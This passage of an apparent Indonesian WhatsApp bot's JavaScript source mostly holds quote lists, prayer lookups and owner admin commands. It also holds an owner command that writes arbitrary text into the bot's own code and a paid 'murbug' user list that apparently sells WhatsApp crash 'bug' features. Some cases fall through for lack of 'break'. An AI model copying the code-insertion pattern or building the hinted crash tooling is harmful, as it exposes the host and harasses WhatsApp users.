"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Hazazeltruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${Hazazeltruth}`)
}
break           
  case 'quotesislami': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const islam = [
"Doa adalah kekuatan orang beriman yang tak terlihat, tapi sangat dahsyat.",

"Allah mendengar bahkan doa yang tidak terucap. Maka jangan ragu untuk berharap.",

"Teruslah berdoa, meski hatimu lelah. Karena Allah tak pernah lelah mendengarkan.",

"Hijrah bukan hanya tentang penampilan, tapi tentang memperbaiki hubungan dengan Allah.",

"Berubah karena Allah adalah proses terindah dalam hidup seorang hamba.",

"Hari ini mungkin kau masih belajar, tapi besok kau bisa jadi inspirasi.",

"Cinta sejati adalah yang mendekatkanmu pada Allah, bukan menjauhkanmu dari-Nya.",

"Jodoh itu bukan siapa cepat, tapi siapa yang siap dengan iman dan takwa.",

"Cintailah seseorang karena Allah, agar cintamu tak pernah sia-sia.",

"Lakukan yang terbaik, lalu serahkan hasilnya pada Allah. Itulah hakikat tawakal.",

"Saat kamu merasa lemah, ingatlah bahwa Allah adalah sebaik-baik penolong.",

"Tawakal bukan pasrah tanpa usaha, tapi yakin setelah berikhtiar.",

"Sabar bukan berarti diam, tapi percaya bahwa Allah sedang mempersiapkan yang terbaik.",

"Kesabaran adalah kunci yang membuka pintu keberkahan.",

"Jangan menyerah hanya karena prosesnya berat, bisa jadi itu jalan menuju surga.",

"Jika Allah sudah menjadi tujuan, maka tak ada langkah yang sia-sia.",

"Allah tidak pernah terlambat dalam menjawab doa. Dia hanya menunggu waktu yang tepat.",

"Hati yang dekat dengan Allah tidak akan pernah merasa sendiri.",

"Tugas kita bukanlah untuk sempurna, tapi untuk terus berusaha menjadi lebih baik di jalan-Nya.",

"Rezeki tidak pernah tertukar, yang penting adalah ikhtiar dan tawakal.",
]
    let bacotan = pickRandom(islam)
  reply(bacotan)
}
case "cekidch": case "idch": {
    if (!text) return m.reply("linkchnya")
    if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await sock.newsletterMetadata("invite", result)
        if (!res) return m.reply("Gagal mengambil metadata")
        let teks = `
*ID :* ${res.id}
*Nama :* ${res.name}
*Total Pengikut :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
        `
        return m.reply(teks)
    } catch (error) {
        console.error(error);
        return m.reply("Terjadi kesalahan saat mengambil metadata");
    }
}
break                    
case 'doaharian': {
let src = JSON.parse(fs.readFileSync('./lib/doaharian.json', 'utf-8'))
let caption = src.map((v, i) => {
return `
*${i + 1}.* ${v.title}

•°• Latin :
${v.latin}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
}).join('\n\n')
m.reply(`${caption}`)
}
break
case 'doatahlil': {
let { result } = JSON.parse(fs.readFileSync('./lib/tahlil.json', 'utf-8'))
let caption = result.map((v, i) => {
return `
*${i + 1}.* ${v.title}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
}).join('\n\n')
m.reply(`${caption}`)
}
break

case 'kisahnabi': {
     if (!text) return reply(`Masukan nama nabi\nContoh: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     reply(`${hasil}`)

}
break           
case "muslimAI":
case "muslimAi":
case "muslimai": {
if (!text) return reply("Mau Nanya Apa Ke MuslimAi")
async function muslimAi(text) {
    try {
        const response = await axios.get(`https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`)
 reply(`*[ Muslim Ai ]*\n\nPertanyaan: ${text}\n\nJawaban: ${JSON.stringify(response.data.data, null, 2)}`)
    } catch (e) {
        m.reply(e)
    }
}

muslimAi(text)
}

break	          
           
case 'tourl': {
                if (!m.quoted) return m.reply(`*Reply the Video/Image Caption* ${prefix + command}`)
                let q = m.quoted ? m.quoted : m
                sock.sendMessage(from, {
                    react: {
                        text: '🕐',
                        key: m.key
                    }
                });
                let media = await q.download()
                let uploadImage = require('./lib/heltourl')
                let link = await uploadImage(media)
                m.reply(`Your Link : ${link}\nExpired Date : Liftime`)
            }
break
  case 'addcase': {
 if (!isOwner) return sock('lu sapa asu')
 if (!text) return sock('Mana case nya');
    const fs = require('fs');
const namaFile = 'Overide.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                sock('Terjadi kesalahan saat menulis file:', err);
            } else {
                sock('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        sock('Tidak dapat menambahkan case dalam file.');
    }
});

}         
break
           
   case "getcase": {
if (!isOwner) return sock(mess.owner)
if (!text) return sock("menu")
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./erlangga.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
sock(`${getcase(q)}`)
} catch (e) {
return sock(`Case *${text}* Tidak Ditemukan`)
}
}
break          
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           

case "addowner": {
if (!isCreator) return m.reply("`Fitur Khusus Owne`")
if (!text && !m.quoted) return m.reply(`ᴇxᴀᴍᴘʟᴇ ${command} 62###`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owner.includes(input) || input === botNumber) return m.reply(`𝖘𝖚𝖈𝖈𝖊𝖘 ${command}`)
owner.push(input)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner, null, 2))
m.reply(`𝖘𝖚𝖈𝖈𝖊𝖘 ${command}`)
}
break
case 'delowner': {
    if (!isCreator) return m.reply("Fitur Khusus Owne");
    if (args.length < 1) return m.reply(`ᴇxᴀᴍᴘʟᴇ ${command} 62###`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            owner.splice(getOwnerPosition(m.mentionedJid[i], owner), 1);
            fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(owner));
        }
        m.reply("Delete success");
    } else {
        owner.splice(getOwnerPosition(args[0] + "@s.whatsapp.net", owner), 1);
        fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(owner));
        m.reply("Success");
    }
}
break
case "addmurbug":{
if (!isOwner && !isCreator) return reply(`Fitur Khusus Owner`)
if (!args[0]) return reply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await sock.onWhatsApp(prrkek)
if (ceknya.length == 0) return replydaf(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
premium.push(prrkek)
fs.writeFileSync("./lib/Database/premium.json", JSON.stringify(premium))
reply(`*Nomor ${prrkek} Telah Menjadi Murbug!*`)
}
break
break
case "delmurbug":{
if (!isOwner && !isCreator) return reply(`Fitur Khusus Owner`)
if (!args[0]) return reply(`_ *Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××* _`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = senderNumber.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync("./lib/Database/premium.json", JSON.stringify(premium))
reply(`*Nomor ${ya} Telah Di Hapus Murbug!*`)
}    
break
            case "public": {
if (!isCreator) return reply("Fitur Khusus Owner Bot") 
sock.public = true
reply(" Succes Public Mode ") 
}
break
case "self": {
if (!isCreator) return reply("Fitur Khusus Owner Bot") 
sock.public = false
reply(" Succes Self Mode ") 
}

            break
            case "hidetag": {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !Access) return reply(mess.admin)
                if (m.quoted) {
                    sock.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    sock.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: loli })
                }
            }
            break
            case "swgrup": {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || "";
        const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
        const jid = m.chat;

        // function react biar rapi
        const react = async (emo) => {
            await sock.sendMessage(m.chat, {
                react: { text: emo, key: m.key }
            });
        };

        if (/image/.test(mime)) {
            const buffer = await quoted.download();
            await sock.sendMessage(jid, {
                groupStatusMessage: {
                    image: buffer,
                    caption
                }
            });
            await react("✅");

        } else if (/video/.test(mime)) {
            const buffer = await quoted.download();
            await sock.sendMessage(jid, {
                groupStatusMessage: {
                    video: buffer,
                    caption
                }
            });
            await react("✅");

        } else if (/audio/.test(mime)) {
            const buffer = await quoted.download();
            await sock.sendMessage(jid, {
                groupStatusMessage: {
                    audio: buffer
                }
            });
            await react("✅");

        } else if (caption) {
            await sock.sendMessage(jid, {
                groupStatusMessage: {
                    text: caption
                }
            });
            await react("✅");

        } else {
            await reply(`Reply media atau tambahkan teks.\nContoh: ${prefix + command} (reply image/video/audio) Hai ini saya`);
        }

    } catch (e) {
        console.log(e);
        await sock.sendMessage(m.chat, {
            react: { text: "❌", key: m.key }
        });
    }
}
case "reactch":
case "rch": {
  if (!isPremium && !isOwner) return m.reply(mess.premium);
  if (!text) return reply("Contoh:\n.rch https://whatsapp.com/channel/xxx/idpesan pongror");
  if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid");

  const hurufGaya = {
